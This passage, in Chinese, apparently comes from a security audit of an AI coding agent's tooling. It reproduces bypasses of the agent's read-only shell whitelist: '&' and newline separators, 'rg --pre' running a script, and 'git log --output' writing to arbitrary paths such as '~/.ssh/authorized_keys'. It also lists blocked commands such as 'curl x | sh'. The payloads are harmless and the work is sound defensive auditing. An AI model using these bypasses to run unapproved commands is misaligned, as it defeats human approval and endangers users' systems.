**这个结果本身是有价值的界定**：**P0-3 的范围就是 3 条断言（C9b/C9c/I8b），不是冰山一角。** 全仓 380 处断言字面串里没有更多同类。

**同时得到一个方法论结论（对"怎么修"有直接影响）**：报告初稿建议"把'断言目标串必须存在于源码/fixture'做成体检规则"——**这个规则不能naively 自动化**，它会对两类情况假阳：
1. **运行时拼接的串**（`"前缀" + i`）
2. **"必须不存在"的否定断言**（`not.toContain("spawn_agent_merge")`）

**正确做法更窄也更可靠**：隔离类哨兵串（如 canary）应**声明为具名常量并写在 fixture 里**（`CANARY` 就是这个形态，`:69` 已定义——问题只是没用），这样"存在性"可机械校验；而"必须不存在"的断言天然无法用存在性规则覆盖，只能靠人读。

### 9.9 未复现项（诚实边界）

| 结论 | 为何未复现 |
|---|---|
| P0-3 门禁恒真断言 | 断言恒真性由**全仓 grep 反证**（目标串只出现在断言自身），已是最强静态证据；跑 `agents-check` 需 Electron/编排全链路，成本高且其红/绿不改变"该断言永不失败"的事实 |
| P1-4 / P1-10 / P1-14（并发类） | 需构造双实例/并发时序，未做 |
| P1-7 / P1-8 / P1-9（子进程类） | 需真实语言服务器 / 恶意 git hook 仓库，未做 |
| P1-12 / P1-13（插件软链 / loose skill） | 需真实插件加载链路 + 信任文件预置，未做（与 9.4 同族，机制已由 9.4 证实） |
| C7/C8（SSE 解析 / usage） | 需真实 provider 凭据，未做 |
| 性能类（根因 5 各项） | 需构造长会话/大仓库，未做量化 |

**方法论提示（给下一轮）**：本轮最大的教训是 **"静态审查给出的严重度，会在实跑阶段被重排"**。P0-4 在静态阶段只是一条 P1（"测试用了固定 sleep，慢机可能假红"），实跑后升为 P0 并推翻了一条已结案记录。**下一轮的流程应把"跑一次完整测试套件 + 对 P0/P1 做纯函数探针"从可选项改成前置步骤**——纯函数探针成本极低（本轮 3 个探针合计 < 1 分钟），但把 5 条结论从"推断"升级为"证实"。

### 9.10 P0-6 端到端复现（只读白名单的三类逃逸）—— **全部复现成功**

P0-1 我只测了"哪个**分隔符**漏了"。为回答"这个白名单**实际允许了什么**"，做了两轮系统扫描。

**扫描一：分隔符（载荷统一 `cat a<SEP>git push --force`）**

```
;              ⛔ 拦截
&&             ⛔ 拦截
||             ⛔ 拦截
|              ⛔ 拦截
&（单与号）      ✅ 放行     ← 新发现
|&             ⛔ 拦截（但理由错：& 被当成独立段的命令名）
\n             ✅ 放行
\r\n           ✅ 放行
\n\n           ✅ 放行
cat a & (git push --force)   ✅ 放行   ← 子shell 组合
```

**端到端证明 `&` 真的执行第二条命令**（无害载荷）：

```
$ bash -c "cat README.md > /dev/null & echo SECOND_COMMAND_RAN"
SECOND_COMMAND_RAN          ← 第二条命令执行了
cat: README.md: No such file or directory
```

**扫描二：白名单命令的 flag 面 → 6 条危险 flag 全部放行**

```
rg --pre /tmp/evil.sh pattern .                   ✅ 放行
rg --pre=/tmp/evil.sh pattern .                   ✅ 放行
rg --pre-glob '*.js' --pre /tmp/evil.sh pattern . ✅ 放行
git log --ext-diff                                ✅ 放行
git diff --ext-diff                               ✅ 放行
git show --ext-diff HEAD                          ✅ 放行
git log --output=/tmp/pwned.log                   ✅ 放行
git diff --output=/tmp/pwned.diff                 ✅ 放行
git show --output=/tmp/pwned.show HEAD            ✅ 放行
git log --output=/Users/ze/.ssh/authorized_keys   ✅ 放行     ← 任意路径
```

**端到端证明（全部无害载荷）**：

① **任意命令执行**——`rg --pre` 会执行指定的外部命令：

```
$ printf '#!/bin/sh\necho AUDIT_PRE_EXECUTED "$1"\n' > /tmp/audit-pre.sh && chmod +x /tmp/audit-pre.sh
$ bash -c "rg --pre=/tmp/audit-pre.sh 'AUDIT_PRE_EXECUTED' package.json"
AUDIT_PRE_EXECUTED package.json        ← rg 执行了我写的脚本
```

② **任意文件写（含工作区外）**：

```
$ bash -c "git log --output=/tmp/audit-pwned.txt -1"
$ ls -la /tmp/audit-pwned.txt
-rw-r--r--  567 bytes      ← 文件被创建，含 git log 内容
```

③ **对照**（证明不是"过滤器整体失效"，而是"只漏了参数面"）：

```
ls -la                        ✅ 放行（正常只读）
git status                    ✅ 放行（正常只读）
cat README.md | wc -l         ✅ 放行（正常只读管道）
cat a | tee out               ⛔ 拦截（写向命令被正确拒绝）
cat a > out                   ⛔ 拦截（重定向被正确拒绝）
curl x | sh                   ⛔ 拦截（非白名单命令被正确拒绝）
```

**结论**：`shell_ro` 的"只读"保证在**三个层面**失效——① 分隔符（`\n` / `&`）；② 参数可执行命令（`rg --pre`）；③ 参数可写文件（`git log --output`）。前两个可组合出**零审批的任意代码执行**，第三个可**写出工作区任意路径**。而对照组显示过滤器在它**设计覆盖的范围内工作正常**——所以这不是"实现有 bug"，而是"**设计选错了校验面**"：把"只读"寄托在"命令名"上，而"命令名"与"命令行为"之间没有对应关系。

**所有探针脚本已删除，`/tmp` 下的验证产物已清理，工作树 `git diff` 为空。**
